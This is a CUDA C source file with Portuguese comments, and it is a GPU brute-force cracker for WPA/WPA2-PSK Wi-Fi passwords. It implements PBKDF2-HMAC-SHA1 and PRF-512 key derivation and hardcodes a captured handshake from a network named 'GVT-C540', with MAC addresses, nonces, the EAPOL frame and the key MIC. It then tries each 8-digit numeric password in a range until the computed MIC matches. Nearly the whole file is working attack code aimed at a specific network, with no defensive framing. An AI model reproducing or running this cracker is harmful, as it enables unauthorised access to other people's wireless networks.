
#include "cuda_runtime.h"
#include "device_launch_parameters.h"
 
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <locale.h>
 
#include "libraries/wpapsk.h" 
#include "libraries/md5.h"
#include "libraries/sha1.h"
 
 
#include "libraries/common.h" 
#include "libraries/others.h"
  
   
    

__constant__ wpapsk_cap cap[1];

__device__ static void preproc(const uint8_t * key, uint32_t keylen,
	uint32_t * state, uint32_t padding)
{
	int i;
	uint32_t W[16], temp;

	for (i = 0; i < 16; i++)
		W[i] = padding;

	for (i = 0; i < keylen; i++)
		XORCHAR_BE(W, i, key[i]);

	uint32_t A = INIT_A;
	uint32_t B = INIT_B;
	uint32_t C = INIT_C;
	uint32_t D = INIT_D;
	uint32_t E = INIT_E;

	SHA1(A, B, C, D, E, W);

	state[0] = A + INIT_A;
	state[1] = B + INIT_B;
	state[2] = C + INIT_C;
	state[3] = D + INIT_D;
	state[4] = E + INIT_E;

}

__device__ static void hmac_sha1(uint32_t * output,
	uint32_t * ipad_state, uint32_t * opad_state, const uint8_t * salt,
	int saltlen, uint8_t add)
{
	int i;
	uint32_t temp, W[16];
	uint32_t A, B, C, D, E;
	uint8_t buf[64];
	uint32_t *src = (uint32_t *)buf;
	i = 64 / 4;
	while (i--)
		*src++ = 0;
	memcpy(buf, salt, saltlen);
	buf[saltlen + 4] = 0x80;
	buf[saltlen + 3] = add;
	PUT_WORD_32_BE((64 + saltlen + 4) << 3, buf, 60);

	A = ipad_state[0];
	B = ipad_state[1];
	C = ipad_state[2];
	D = ipad_state[3];
	E = ipad_state[4];

	for (i = 0; i < 16; i++)
		GET_WORD_32_BE(W[i], buf, i * 4);

   	SHA1(A, B, C, D, E, W);

	A += ipad_state[0];
	B += ipad_state[1];
	C += ipad_state[2];
	D += ipad_state[3];
	E += ipad_state[4];

	PUT_WORD_32_BE(A, buf, 0);
	PUT_WORD_32_BE(B, buf, 4);
	PUT_WORD_32_BE(C, buf, 8);
	PUT_WORD_32_BE(D, buf, 12);
	PUT_WORD_32_BE(E, buf, 16);

	buf[20] = 0x80;
	PUT_WORD_32_BE(0x2A0, buf, 60);

	A = opad_state[0];
	B = opad_state[1];
	C = opad_state[2];
	D = opad_state[3];
	E = opad_state[4];

	for (i = 0; i < 16; i++)
		GET_WORD_32_BE(W[i], buf, i * 4);

	SHA1short(A, B, C, D, E, W);

	A += opad_state[0];
	B += opad_state[1];
	C += opad_state[2];
	D += opad_state[3];
	E += opad_state[4];

	output[0] = A;
	output[1] = B;
	output[2] = C;
	output[3] = D;
	output[4] = E;
}



__device__ static void big_hmac_sha1(uint32_t * input, uint32_t inputlen,
	uint32_t * ipad_state, uint32_t * opad_state, uint32_t * tmp_out)
{
	int i, lo;
	uint32_t temp, W[16];
	uint32_t A, B, C, D, E;

	for (i = 0; i < 5; i++)
		W[i] = input[i];

	for (lo = 1; lo < ITERATIONS; lo++) {

		A = ipad_state[0];
		B = ipad_state[1];
		C = ipad_state[2];
		D = ipad_state[3];
		E = ipad_state[4];

		W[5] = 0x80000000;
		W[15] = 0x2A0;

		SHA1short(A, B, C, D, E, W);

		A += ipad_state[0];
		B += ipad_state[1];
		C += ipad_state[2];
		D += ipad_state[3];
		E += ipad_state[4];

		W[0] = A;
		W[1] = B;
		W[2] = C;
		W[3] = D;
		W[4] = E;
		W[5] = 0x80000000;
		W[15] = 0x2A0;

		A = opad_state[0];
		B = opad_state[1];
		C = opad_state[2];
		D = opad_state[3];
		E = opad_state[4];

		SHA1short(A, B, C, D, E, W);
		 
		A += opad_state[0];
		B += opad_state[1];
		C += opad_state[2];
		D += opad_state[3];
		E += opad_state[4];

		W[0] = A;
		W[1] = B;
		W[2] = C;
		W[3] = D;
		W[4] = E;

		tmp_out[0] ^= A;
		tmp_out[1] ^= B;
		tmp_out[2] ^= C;
		tmp_out[3] ^= D;
		tmp_out[4] ^= E;
	} 

	for (i = 0; i < 5; i++)
		tmp_out[i] = SWAP(tmp_out[i]);
}


__device__ void pbkdf2(const uint8_t * pass, int passlen, const uint8_t *essid,
	int sessid, uint8_t * out)
{
	uint32_t ipad_state[5];
	uint32_t opad_state[5];
	uint32_t tmp_out[5];

	preproc(pass, passlen, ipad_state, 0x36363636);
	preproc(pass, passlen, opad_state, 0x5c5c5c5c);

	hmac_sha1(tmp_out, ipad_state, opad_state, essid, sessid, 0x01);

	big_hmac_sha1(tmp_out, SHA1_DIGEST_LENGTH, ipad_state, opad_state,
		tmp_out);

	memcpy(out, tmp_out, 20);

	hmac_sha1(tmp_out, ipad_state, opad_state, essid, sessid, 0x02);

	big_hmac_sha1(tmp_out, SHA1_DIGEST_LENGTH, ipad_state, opad_state,
		tmp_out);

	memcpy(out + 20, tmp_out, 12);
} 

__device__ void PRF512(uint8_t *pmk, uint8_t *mic)
{
	// PKE e PTK usados no cálculo do MIC
	uint8_t pke[100];
	uint8_t ptk[80];

	// Constroe o buffer de expansão da chave
	memcpy(pke, "Pairwise key expansion", 23);
	// Adiciona os MACs
	if (cudaMemCmp(cap[0].smac, cap[0].amac, 6) < 0)
	{
		memcpy(pke + 23, cap[0].smac, 6);
		memcpy(pke + 29, cap[0].amac, 6);
	}
	else
	{
		memcpy(pke + 23, cap[0].amac, 6);
		memcpy(pke + 29, cap[0].smac, 6);
	}

	// Adiciona os Nonces
	if (cudaMemCmp(cap[0].snonce, cap[0].anonce, 32) < 0)
	{
		memcpy(pke + 35, cap[0].snonce, 32);
		memcpy(pke + 67, cap[0].anonce, 32);
	}
	else
	{
		memcpy(pke + 35, cap[0].anonce, 32);
		memcpy(pke + 67, cap[0].snonce, 32);
	}

	// Calcula o PTK
	for (int i = 0; i < 4; i++)
	{
		pke[99] = i;
		sha1_hmac(pmk, 32, pke, 100, ptk + i * 20);
	}

	// Calcula o MIC
	if (cap[0].keyver == 1)
		md5_hmac(ptk, 16, cap[0].eapol, cap[0].eapol_size, mic);
	else
		sha1_hmac(ptk, 16, cap[0].eapol, cap[0].eapol_size, mic);
}



__device__ void process(wpapsk_password *password, wpapsk_result *result, int id)
{
	//if (0 < id && id < 34)
	//{
		pbkdf2(password->v, password->length,
			cap[0].essid, cap[0].sessid, result->pmk);

		PRF512(result->pmk, result->mic);
	//}

//	if (password->n == 3003000669)
//		printf("aqui\n");
}

 
__global__ void myKernel(wpapsk_password *password, wpapsk_result *result)
{ 
	int idx = blockIdx.x * blockDim.x + threadIdx.x;
	// O ID está fora do intervalo?
	//if (idx < PWD_BATCH_SIZE_GPU)
	//printf("%i\n", idx);
	//for (int j = 0; j < WORK_BY_THREAD; j++)
	//{

		//int id = idx + (THREADS * j);
		//printf("%i\n", idx);
		process(&password[idx], &result[idx], idx);
	//}
	
}



void print_work(unsigned long* pfpwd, unsigned long* plpwd, wpapsk_cap* phdsk)
{
	int i = 0;

	printf("----------------------------------------\n");
	printf("password range: %08lu to %08lu\n", *pfpwd, *plpwd);
	printf("essid: %s\n", phdsk->essid);
	printf("s-mac: %02x", phdsk->smac[0]);
	for (i = 1; i<6; ++i)
		printf(":%02x", phdsk->smac[i]);
	putchar('\n');
	printf("a-mac: %02x", phdsk->amac[0]);
	for (i = 1; i<6; ++i)
		printf(":%02x", phdsk->amac[i]);
	putchar('\n');
	printf("s-nonce: ");
	for (i = 0; i<32; ++i)
		printf("%02x", phdsk->snonce[i]);
	putchar('\n');
	printf("a-nonce: ");
	for (i = 0; i<32; ++i)
		printf("%02x", phdsk->anonce[i]);
	putchar('\n');
	printf("key version: %u (%s)\n", phdsk->keyver, phdsk->keyver == 1 ? "HMAC-MD5" : "HMAC-SHA1-128");
	printf("key mic: ");
	for (i = 0; i<16; ++i)
		printf("%02x", phdsk->keymic[i]);
	putchar('\n');
	printf("eapol frame content size: %u bytes\n", phdsk->eapol_size);
	printf("eapol frame content (with mic reset): \n");
	for (i = 1; i <= phdsk->eapol_size; ++i)
		printf("%02x%c", phdsk->eapol[i - 1], i % 16 == 0 ? '\n' : ' ');
	putchar('\n');
	printf("----------------------------------------\n");
}

  
int main(int argc, char** argv)
{
	cudaSetDevice(0);

	setlocale(LC_ALL, "Portuguese");

	/* estrutura CUDA que permite armazenar tempo */
	cudaEvent_t start, stop;
	float totalTime = 0, keys = 0, time = 0;

	wpapsk_cap *link = (wpapsk_cap *)calloc(1, sizeof(wpapsk_cap));

	link->keyver = 1;
	link->sessid = strlen("GVT-C540");
	memcpy(link->essid, "GVT-C540", link->sessid);
	memcpy(link->amac, "\x2C\x39\x96\x83\xC5\x44", sizeof(link->amac));
	memcpy(link->smac, "\x60\x57\x18\x25\xEA\xA9", sizeof(link->smac));

	memcpy(link->anonce, "\x26\x68\xD3\xD2\xD3\xF5\x9C\x38\xB6\xB8\xE2\xEA\x43\x9F\xB0\x8F"
		"\x5E\x70\x27\x27\x11\xE1\xE3\xA1\xD4\x16\x86\x6E\x11\xAC\xFD\x93", sizeof(link->anonce));
	memcpy(link->snonce, "\xC8\xD1\x3A\x0B\xDB\x0D\x13\xF1\x5C\xF8\x76\x14\x2E\x1D\x69\x2E"
		"\x3B\xA8\x8B\x14\xBB\xF6\xE4\xDC\xFB\xF4\x5D\x48\xE1\x67\xD9\x9E", sizeof(link->snonce));
	memcpy(link->keymic, "\x8B\x33\x08\x03\x35\xE9\x50\x31\x80\xB4\xE3\x46\xB9\x61\x67\x2B", sizeof(link->keymic));

	link->eapol_size = 125;
	memcpy(link->eapol, "\x01\x03\x00\x79\xFE\x01\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x01\xC8\xD1\x3A\x0B\xDB\x0D\x13\xF1\x5C\xF8\x76\x14\x2E\x1D\x69"
		"\x2E\x3B\xA8\x8B\x14\xBB\xF6\xE4\xDC\xFB\xF4\x5D\x48\xE1\x67\xD9"
		"\x9E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x1A\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x01"
		"\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x3C\x00", link->eapol_size);

	 
	float gpu_speed = 0;

	// Imprime as informações recebidas
	print_work(&first_pwd, &last_pwd, link);

	// Senha em formato de string
	char key[64];
	memset(key, 0, sizeof(key));



	
	int sizeKey, notProcess = 0;

	wpapsk_password *cuda_password;
	wpapsk_result *cuda_result;

	cudaMemcpyToSymbol(cap, link, sizeof(wpapsk_cap));


	/* Inicia o cronometro e registra o tempo */
	cudaEventCreate(&start);
	cudaEventCreate(&stop);

	// Aloca memória na CPU
	wpapsk_password *password = (wpapsk_password *)calloc(SIZE_VECTOR, sizeof(wpapsk_password));
	wpapsk_result *result = (wpapsk_result *)calloc(SIZE_VECTOR, sizeof(wpapsk_result));


	// Aloca memória na GPU
	cudaMalloc(&cuda_password, sizeof(wpapsk_password) * SIZE_VECTOR);
	cudaMalloc(&cuda_result, sizeof(wpapsk_result) * SIZE_VECTOR);


	// Repetidamente obter intervalos de senha para despachar para as GPUs
	for (unsigned long begin = first_pwd, end = begin + SIZE_VECTOR;
		begin <= last_pwd; 
		begin += SIZE_VECTOR, end = begin + SIZE_VECTOR)
	{
		cudaEventRecord(start);

		unsigned long pass = begin;
		 
		for (int i = 0; i < SIZE_VECTOR; i++)
		{
			sprintf(key, "%08lu", pass);
			sizeKey = strlen(key);
			memcpy(password[i].v, key, sizeKey);
			password[i].length = sizeKey;
			password[i].n = pass++;
		}

		 
		cudaMemcpy(cuda_password, password, sizeof(wpapsk_password) * SIZE_VECTOR, cudaMemcpyHostToDevice);

		for (int i = 0; i < WORK_BY_TIME; i++)
		{
			myKernel << <BLOCKS, THREADS >> > (&cuda_password[i * THREADS * BLOCKS],
				&cuda_result[i * THREADS * BLOCKS]);
			 
			cudaDeviceSynchronize();
		}
		       
		cudaMemcpy(result, cuda_result, sizeof(wpapsk_result) * SIZE_VECTOR, cudaMemcpyDeviceToHost);
		

		/* Para o cronometro e registra o tempo */
		cudaEventRecord(stop);
		cudaEventSynchronize(stop);
		cudaEventElapsedTime(&time, start, stop);
		totalTime += (time / 1000);


		keys += (end - begin);
		gpu_speed = (keys / totalTime);


		
		//Sleep(30000);

		for (int i = 0; i < SIZE_VECTOR; i++)
		{
			if (memcmp(result[i].pmk, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16) == 0)
				notProcess++;

			if (memcmp(result[i].mic, link->keymic, 16) == 0)
			{
				printf("\n\n!!! Senha encontrada !!! [%.*s]\n", password[i].length, password[i].v);

				printf("Tempo total: %.2f segundos\n", totalTime);

				goto fim;
			}
		}

		printf("\r%08.1f PMK/s CUR: %08lu, Chaves Não Processadas: %i", gpu_speed, end, notProcess);
	}


	printf("\n\nSenha não encontrada\n");

	 
	fim:
	// Libera recursos
	cudaEventDestroy(start);
	cudaEventDestroy(stop);

	cudaFree(cuda_result);
	cudaFree(cuda_password);
	free(password);
	free(result);

	system("PAUSE");
	return 0;
}
